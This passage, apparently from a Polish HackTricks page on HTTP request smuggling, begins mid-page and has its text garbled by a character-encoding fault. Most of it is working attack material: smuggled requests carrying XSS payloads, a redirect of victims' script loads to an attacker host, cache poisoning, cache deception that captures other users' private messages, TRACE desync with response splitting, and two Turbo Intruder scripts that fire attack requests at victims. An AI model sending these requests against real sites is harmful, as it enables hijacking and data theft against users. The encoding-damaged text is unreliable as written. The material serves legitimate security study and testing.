W scenariuszach, w ktÃ³rych strona internetowa jest podatna na odzwierciedlone XSS poprzez nagÅ‚Ã³wek User-Agent, poniÅ¼szy Å‚adunek demonstruje, jak wykorzystaÄ‡ tÄ™ podatnoÅ›Ä‡:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ten Å‚adunek jest skonstruowany w celu wykorzystania luki poprzez:

1. Inicjowanie Å¼Ä…dania `POST`, ktÃ³re wydaje siÄ™ typowe, z nagÅ‚Ã³wkiem `Transfer-Encoding: chunked`, aby wskazaÄ‡ poczÄ…tek smugglingu.
2. NastÄ™pnie, po nim, pojawia siÄ™ `0`, oznaczajÄ…ce koniec ciaÅ‚a wiadomoÅ›ci chunked.
3. NastÄ™pnie wprowadzane jest smuggled `GET` Å¼Ä…danie, w ktÃ³rym nagÅ‚Ã³wek `User-Agent` jest wstrzykiwany z skryptem, `<script>alert(1)</script>`, co wywoÅ‚uje XSS, gdy serwer przetwarza to kolejne Å¼Ä…danie.

ManipulujÄ…c `User-Agent` poprzez smuggling, Å‚adunek omija normalne ograniczenia Å¼Ä…daÅ„, wykorzystujÄ…c w ten sposÃ³b lukÄ™ Reflected XSS w niestandardowy, ale skuteczny sposÃ³b.

#### HTTP/0.9

{% hint style="danger" %}
W przypadku, gdy zawartoÅ›Ä‡ uÅ¼ytkownika jest odzwierciedlana w odpowiedzi z **`Content-type`** takim jak **`text/plain`**, co uniemoÅ¼liwia wykonanie XSS. JeÅ›li serwer obsÅ‚uguje **HTTP/0.9, moÅ¼e byÄ‡ moÅ¼liwe ominiÄ™cie tego**!
{% endhint %}

Wersja HTTP/0.9 byÅ‚a wczeÅ›niejsza od 1.0 i uÅ¼ywa tylko czasownikÃ³w **GET** oraz **nie** odpowiada z **nagÅ‚Ã³wkami**, tylko ciaÅ‚em.

W [**tym opisie**](https://mizu.re/post/twisty-python) to zostaÅ‚o naduÅ¼yte z wykorzystaniem smugglingu Å¼Ä…daÅ„ i **wraÅ¼liwego punktu koÅ„cowego, ktÃ³ry odpowiada na dane uÅ¼ytkownika**, aby smuggled Å¼Ä…danie z HTTP/0.9. Parametr, ktÃ³ry bÄ™dzie odzwierciedlany w odpowiedzi, zawieraÅ‚ **faÅ‚szywÄ… odpowiedÅº HTTP/1.1 (z nagÅ‚Ã³wkami i ciaÅ‚em)**, wiÄ™c odpowiedÅº bÄ™dzie zawieraÄ‡ waÅ¼ny wykonawczy kod JS z `Content-Type` rÃ³wnym `text/html`.

### Wykorzystywanie przekierowaÅ„ na stronie z uÅ¼yciem HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacje czÄ™sto przekierowujÄ… z jednego URL do drugiego, uÅ¼ywajÄ…c nazwy hosta z nagÅ‚Ã³wka `Host` w URL przekierowania. Jest to powszechne w serwerach internetowych, takich jak Apache i IIS. Na przykÅ‚ad, Å¼Ä…danie folderu bez ukoÅ›nika na koÅ„cu skutkuje przekierowaniem, aby dodaÄ‡ ukoÅ›nik:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Wyniki w:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
ChoÄ‡ na pozÃ³r nieszkodliwe, to zachowanie moÅ¼na wykorzystaÄ‡ za pomocÄ… HTTP request smuggling do przekierowywania uÅ¼ytkownikÃ³w na zewnÄ™trznÄ… stronÄ™. Na przykÅ‚ad:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ten przemycony Å¼Ä…danie moÅ¼e spowodowaÄ‡, Å¼e nastÄ™pne przetworzone Å¼Ä…danie uÅ¼ytkownika zostanie przekierowane na stronÄ™ kontrolowanÄ… przez atakujÄ…cego:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Wyniki w:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
W tym scenariuszu Å¼Ä…danie uÅ¼ytkownika dotyczÄ…ce pliku JavaScript jest przechwytywane. AtakujÄ…cy moÅ¼e potencjalnie skompromitowaÄ‡ uÅ¼ytkownika, dostarczajÄ…c zÅ‚oÅ›liwy JavaScript w odpowiedzi.

### Wykorzystywanie zÅ‚oÅ›liwego zatrucia pamiÄ™ci podrÄ™cznej przez HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Zatrucie pamiÄ™ci podrÄ™cznej w sieci moÅ¼e byÄ‡ zrealizowane, jeÅ›li jakikolwiek komponent **infrastruktury front-endowej buforuje treÅ›ci**, zazwyczaj w celu poprawy wydajnoÅ›ci. ManipulujÄ…c odpowiedziÄ… serwera, moÅ¼liwe jest **zatrucie pamiÄ™ci podrÄ™cznej**.

WczeÅ›niej zaobserwowaliÅ›my, jak odpowiedzi serwera mogÄ… byÄ‡ zmieniane, aby zwracaÅ‚y bÅ‚Ä…d 404 (zobacz [Podstawowe przykÅ‚ady](./#basic-examples)). Podobnie, moÅ¼liwe jest oszukanie serwera, aby dostarczyÅ‚ treÅ›Ä‡ `/index.html` w odpowiedzi na Å¼Ä…danie dotyczÄ…ce `/static/include.js`. W konsekwencji treÅ›Ä‡ `/static/include.js` zostaje zastÄ…piona w pamiÄ™ci podrÄ™cznej treÅ›ciÄ… `/index.html`, co sprawia, Å¼e `/static/include.js` staje siÄ™ niedostÄ™pne dla uÅ¼ytkownikÃ³w, co potencjalnie prowadzi do Denial of Service (DoS).

Technika ta staje siÄ™ szczegÃ³lnie potÄ™Å¼na, jeÅ›li zostanie odkryta **vulnerabilnoÅ›Ä‡ Open Redirect** lub jeÅ›li istnieje **przekierowanie na stronie do otwartego przekierowania**. Takie luki mogÄ… byÄ‡ wykorzystywane do zastÄ…pienia buforowanej treÅ›ci `/static/include.js` skryptem kontrolowanym przez atakujÄ…cego, co zasadniczo umoÅ¼liwia szerokÄ… atak Cross-Site Scripting (XSS) przeciwko wszystkim klientom Å¼Ä…dajÄ…cym zaktualizowanego `/static/include.js`.

PoniÅ¼ej znajduje siÄ™ ilustracja wykorzystywania **zatrucia pamiÄ™ci podrÄ™cznej w poÅ‚Ä…czeniu z przekierowaniem na stronie do otwartego przekierowania**. Celem jest zmiana treÅ›ci pamiÄ™ci podrÄ™cznej `/static/include.js`, aby dostarczyÄ‡ kod JavaScript kontrolowany przez atakujÄ…cego:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
ZauwaÅ¼ osadzony Å¼Ä…danie skierowane do `/post/next?postId=3`. To Å¼Ä…danie zostanie przekierowane do `/post?postId=4`, wykorzystujÄ…c **wartoÅ›Ä‡ nagÅ‚Ã³wka Host** do okreÅ›lenia domeny. ZmieniajÄ…c **nagÅ‚Ã³wek Host**, atakujÄ…cy moÅ¼e przekierowaÄ‡ Å¼Ä…danie do swojej domeny (**przekierowanie na miejscu do otwartego przekierowania**).

Po udanym **zatruciu gniazda**, powinno zostaÄ‡ zainicjowane **Å¼Ä…danie GET** dla `/static/include.js`. To Å¼Ä…danie zostanie zanieczyszczone przez wczeÅ›niejsze **przekierowanie na miejscu do otwartego przekierowania** i pobierze zawartoÅ›Ä‡ skryptu kontrolowanego przez atakujÄ…cego.

NastÄ™pnie kaÅ¼de Å¼Ä…danie dla `/static/include.js` bÄ™dzie serwowaÄ‡ pamiÄ™tanÄ… zawartoÅ›Ä‡ skryptu atakujÄ…cego, skutecznie uruchamiajÄ…c szerokÄ… akcjÄ™ XSS.

### Wykorzystanie smugglingu Å¼Ä…daÅ„ HTTP do przeprowadzenia oszustwa w pamiÄ™ci podrÄ™cznej <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Jaka jest rÃ³Å¼nica miÄ™dzy zatruciem pamiÄ™ci podrÄ™cznej a oszustwem w pamiÄ™ci podrÄ™cznej?**
>
> * W **zatruciu pamiÄ™ci podrÄ™cznej**, atakujÄ…cy powoduje, Å¼e aplikacja przechowuje w pamiÄ™ci podrÄ™cznej zÅ‚oÅ›liwÄ… zawartoÅ›Ä‡, a ta zawartoÅ›Ä‡ jest serwowana z pamiÄ™ci podrÄ™cznej innym uÅ¼ytkownikom aplikacji.
> * W **oszustwie w pamiÄ™ci podrÄ™cznej**, atakujÄ…cy powoduje, Å¼e aplikacja przechowuje w pamiÄ™ci podrÄ™cznej wraÅ¼liwÄ… zawartoÅ›Ä‡ naleÅ¼Ä…cÄ… do innego uÅ¼ytkownika, a nastÄ™pnie atakujÄ…cy pobiera tÄ™ zawartoÅ›Ä‡ z pamiÄ™ci podrÄ™cznej.

AtakujÄ…cy tworzy przemyÅ›lane Å¼Ä…danie, ktÃ³re pobiera wraÅ¼liwÄ… zawartoÅ›Ä‡ specyficznÄ… dla uÅ¼ytkownika. RozwaÅ¼ nastÄ™pujÄ…cy przykÅ‚ad:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
JeÅ›li ten przemycony Å¼Ä…danie zanieczyÅ›ci wpis w pamiÄ™ci podrÄ™cznej przeznaczony dla statycznej zawartoÅ›ci (np. `/someimage.png`), wraÅ¼liwe dane ofiary z `/private/messages` mogÄ… byÄ‡ zbuforowane pod wpisem pamiÄ™ci podrÄ™cznej statycznej zawartoÅ›ci. W konsekwencji, atakujÄ…cy mÃ³gÅ‚by potencjalnie odzyskaÄ‡ te zbuforowane wraÅ¼liwe dane.

### Wykorzystywanie TRACE za pomocÄ… HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**W tym poÅ›cie**](https://portswigger.net/research/trace-desync-attack) zasugerowano, Å¼e jeÅ›li serwer ma wÅ‚Ä…czonÄ… metodÄ™ TRACE, moÅ¼e byÄ‡ moÅ¼liwe jej wykorzystanie za pomocÄ… HTTP Request Smuggling. Dzieje siÄ™ tak, poniewaÅ¼ ta metoda odzwierciedli kaÅ¼dy nagÅ‚Ã³wek wysÅ‚any do serwera jako czÄ™Å›Ä‡ treÅ›ci odpowiedzi. Na przykÅ‚ad:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
BÄ™dzie wysyÅ‚aÄ‡ odpowiedÅº takÄ… jak:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
PrzykÅ‚ad, jak wykorzystaÄ‡ to zachowanie, polega na **przemyceniu najpierw Å¼Ä…dania HEAD**. To Å¼Ä…danie zostanie odpowiedziane tylko **nagÅ‚Ã³wkami** Å¼Ä…dania GET (**`Content-Type`** wÅ›rÃ³d nich). A nastÄ™pnie przemyciÄ‡ **natychmiast po HEAD Å¼Ä…danie TRACE**, ktÃ³re bÄ™dzie **odzwierciedlaÄ‡ wysÅ‚ane dane**.\
PoniewaÅ¼ odpowiedÅº HEAD bÄ™dzie zawieraÄ‡ nagÅ‚Ã³wek `Content-Length`, **odpowiedÅº Å¼Ä…dania TRACE bÄ™dzie traktowana jako ciaÅ‚o odpowiedzi HEAD, co zatem odzwierciedli dowolne dane** w odpowiedzi.\
Ta odpowiedÅº zostanie wysÅ‚ana do nastÄ™pnego Å¼Ä…dania przez poÅ‚Ä…czenie, wiÄ™c moÅ¼e to byÄ‡ **uÅ¼yte w pamiÄ™ci podrÄ™cznej pliku JS, na przykÅ‚ad do wstrzykniÄ™cia dowolnego kodu JS**.

### Wykorzystywanie TRACE poprzez HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

KontynuujÄ…c [**ten post**](https://portswigger.net/research/trace-desync-attack), sugeruje siÄ™ inny sposÃ³b wykorzystania metody TRACE. Jak wspomniano, przemycajÄ…c Å¼Ä…danie HEAD i Å¼Ä…danie TRACE, moÅ¼liwe jest **kontrolowanie niektÃ³rych odzwierciedlonych danych** w odpowiedzi na Å¼Ä…danie HEAD. DÅ‚ugoÅ›Ä‡ ciaÅ‚a Å¼Ä…dania HEAD jest zasadniczo wskazywana w nagÅ‚Ã³wku Content-Length i jest tworzona przez odpowiedÅº na Å¼Ä…danie TRACE.

Dlatego nowy pomysÅ‚ polega na tym, Å¼e, znajÄ…c ten Content-Length i dane podane w odpowiedzi TRACE, moÅ¼liwe jest sprawienie, aby odpowiedÅº TRACE zawieraÅ‚a waÅ¼nÄ… odpowiedÅº HTTP po ostatnim bajcie Content-Length, co pozwala atakujÄ…cemu caÅ‚kowicie kontrolowaÄ‡ Å¼Ä…danie do nastÄ™pnej odpowiedzi (co mogÅ‚oby byÄ‡ uÅ¼yte do przeprowadzenia zatrucia pamiÄ™ci podrÄ™cznej).

PrzykÅ‚ad:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Wygeneruje te odpowiedzi (zauwaÅ¼, Å¼e odpowiedÅº HEAD ma Content-Length, co sprawia, Å¼e odpowiedÅº TRACE jest czÄ™Å›ciÄ… ciaÅ‚a HEAD, a po zakoÅ„czeniu Content-Length HEAD, waÅ¼na odpowiedÅº HTTP jest przemycana):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### Uzbrajanie HTTP Request Smuggling za pomocÄ… desynchronizacji odpowiedzi HTTP

Czy znalazÅ‚eÅ› jakÄ…Å› podatnoÅ›Ä‡ na HTTP Request Smuggling i nie wiesz, jak jÄ… wykorzystaÄ‡? SprÃ³buj tych innych metod eksploatacji:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Inne techniki HTTP Request Smuggling

* HTTP Request Smuggling w przeglÄ…darkach (strona klienta)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling w downgrade'ach HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Skrypty Turbo intruder

### CL.TE

Z [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Z: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## NarzÄ™dzia

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): To narzÄ™dzie to gramatyczny HTTP Fuzzer przydatny do znajdowania dziwnych rozbieÅ¼noÅ›ci w request smuggling.

## Odniesienia

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
* [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
